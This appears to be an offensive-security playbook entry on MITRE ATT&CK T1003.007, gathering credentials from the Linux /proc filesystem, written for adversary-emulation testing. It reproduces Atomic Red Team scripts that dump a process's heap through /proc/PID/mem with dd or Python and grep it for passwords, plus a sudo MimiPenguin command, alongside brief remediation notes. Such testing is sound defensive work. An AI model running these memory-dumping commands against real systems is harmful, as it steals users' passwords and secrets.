---
name: "T1003.007_proc-filesystem"
description: "Adversaries may gather credentials from the proc filesystem or `/proc`."
category: "authentication"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1003.007
  - credential-access
  - linux
  - sub-technique
technique_id: "T1003.007"
tactic: "credential-access"
all_tactics:
  - credential-access
platforms:
  - Linux
mitre_url: "https://attack.mitre.org/techniques/T1003/007"
tech_stack:
  - linux
cwe_ids:
  - CWE-522
chains_with:
  - T1003
  - T1003.001
  - T1003.002
  - T1003.003
  - T1003.004
  - T1003.005
  - T1003.006
  - T1003.008
prerequisites:
  - T1003
severity_boost:
  T1003: "Chain with T1003 for deeper attack path"
  T1003.001: "Chain with T1003.001 for deeper attack path"
  T1003.002: "Chain with T1003.002 for deeper attack path"
---

# T1003.007 Proc Filesystem

> **Sub-technique of:** T1003

## High-Level Description

Adversaries may gather credentials from the proc filesystem or `/proc`. The proc filesystem is a pseudo-filesystem used as an interface to kernel data structures for Linux based systems managing virtual memory. For each process, the `/proc/<PID>/maps` file shows how memory is mapped within the process’s virtual address space. And `/proc/<PID>/mem`, exposed for debugging purposes, provides access to the process’s virtual address space.

When executing with root privileges, adversaries can search these memory locations for all processes on a system that contain patterns indicative of credentials. Adversaries may use regex patterns, such as <code>grep -E "^[0-9a-f-]* r" /proc/"$pid"/maps | cut -d' ' -f 1</code>, to look for fixed strings in memory structures or cached hashes. When running without privileged access, processes can still view their own virtual memory locations. Some services or programs may save credentials in clear text inside the process’s memory.

If running as or with the permissions of a web browser, a process can search the `/maps` & `/mem` locations for common website credential patterns (that can also be used to find adjacent memory within the same structure) in which hashes or cleartext credentials may be located.

## Kill Chain Phase

- Credential Access (TA0006)

**Platforms:** Linux

## What to Check

- [ ] Identify if Proc Filesystem technique is applicable to target environment
- [ ] Check Linux systems for indicators of Proc Filesystem
- [ ] Verify mitigations are bypassed or absent (2 known mitigations)
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: Dump individual process memory with sh (Local)

Using `/proc/$PID/mem`, where $PID is the target process ID, use shell utilities to
copy process memory to an external file so it can be searched or exfiltrated later.

**Supported Platforms:** linux
**Elevation Required:** Yes

```bash
sh #{script_path}
PID=$(pgrep -n -f "#{pid_term}")
HEAP_MEM=$(grep -E "^[0-9a-f-]* r" /proc/"$PID"/maps | grep heap | cut -d' ' -f 1)
MEM_START=$(echo $((0x$(echo "$HEAP_MEM" | cut -d"-" -f1))))
MEM_STOP=$(echo $((0x$(echo "$HEAP_MEM" | cut -d"-" -f2))))
MEM_SIZE=$(echo $((0x$MEM_STOP-0x$MEM_START)))
dd if=/proc/"${PID}"/mem of="#{output_file}" ibs=1 skip="$MEM_START" count="$MEM_SIZE"
grep -i "PASS" "#{output_file}"
```

**Dependencies:**
- Script to launch target process must exist

### Atomic Test 2: Dump individual process memory with sh on FreeBSD (Local)

Using `/proc/$PID/mem`, where $PID is the target process ID, use shell utilities to
copy process memory to an external file so it can be searched or exfiltrated later.
On FreeBSD procfs must be mounted.

**Supported Platforms:** linux
**Elevation Required:** Yes

```bash
sh #{script_path}
PID=$(pgrep -n -f "#{pid_term}")
MEM_START=$(head -n 5 /proc/"${PID}"/map | tail -1 | cut -d' ' -f1)
MEM_STOP=$(head -n 5 /proc/"${PID}"/map | tail -1 | cut -d' ' -f2)
MEM_SIZE=$(echo $(($MEM_STOP-$MEM_START)))
dd if=/proc/"${PID}"/mem of="#{output_file}" ibs=1 skip="$MEM_START" count="$MEM_SIZE"
strings "#{output_file}" | grep -i PASS
```

**Dependencies:**
- Script to launch target process must exist

### Atomic Test 3: Dump individual process memory with Python (Local)

Using `/proc/$PID/mem`, where $PID is the target process ID, use a Python script to
copy a process's heap memory to an external file so it can be searched or exfiltrated later.
On FreeBSD procfs must be mounted.

**Supported Platforms:** linux
**Elevation Required:** Yes

```bash
sh #{script_path}
PID=$(pgrep -n -f "#{pid_term}")
PYTHON=$(which python || which python3 || which python2)
$PYTHON #{python_script} $PID #{output_file}
grep -i "PASS" "#{output_file}"
```

**Dependencies:**
- Script to launch target process must exist
- Requires Python

### Atomic Test 4: Capture Passwords with MimiPenguin

MimiPenguin is a tool inspired by MimiKatz that targets Linux systems affected by CVE-2018-20781 (Ubuntu-based distros and certain versions of GNOME Keyring). 
Upon successful execution on an affected system, MimiPenguin will retrieve passwords from memory and output them to a specified file. 
See https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20781. 
See https://www.tecmint.com/mimipenguin-hack-login-passwords-of-linux-users/#:~:text=Mimipenguin%20is%20a%20free%20and,tested%20on%20various%20Linux%20distributions.

**Supported Platforms:** linux
**Elevation Required:** Yes

```bash
sudo #{MimiPenguin_Location} > #{output_file}
cat #{output_file}
```

**Dependencies:**
- MimiPenguin script must exist on disk at specified location (#{MimiPenguin_Location})
- Strings must be installed
- Python2 must be installed
- Libc-bin must be installed


### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to Proc Filesystem by examining the target platforms (Linux).

2. **Assess Existing Defenses**: Review whether mitigations for T1003.007 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

### M1027 Password Policies
Ensure that root accounts have complex, unique passwords across all systems on the network.

### M1026 Privileged Account Management
Follow best practices in restricting access to privileged accounts to avoid hostile programs from accessing sensitive information.


## Detection

### Detecting OS Credential Dumping via /proc Filesystem Access on Linux


## Risk Assessment

| Finding | Severity | Impact |
| ------- | -------- | ------ |
| Proc Filesystem technique applicable | High | Credential Access |

## CWE Categories

| CWE ID | Title |
| ------ | ----- |
| CWE-522 | Insufficiently Protected Credentials |


## References

- [atomic-red proc file system](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.007/T1003.007.md)
- [baeldung Linux proc map 2022](https://www.baeldung.com/linux/proc-id-maps)
- [Polop Linux PrivEsc Gitbook](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#proc-usdpid-maps-and-proc-usdpid-mem)
- [MimiPenguin GitHub May 2017](https://github.com/huntergregal/mimipenguin)
- [Picus Labs Proc cump 2022](https://www.picussecurity.com/resource/the-mitre-attck-t1003-os-credential-dumping-technique-and-its-adversary-use)
- [Atomic Red Team - T1003.007](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1003.007)
- [MITRE ATT&CK - T1003.007](https://attack.mitre.org/techniques/T1003/007)
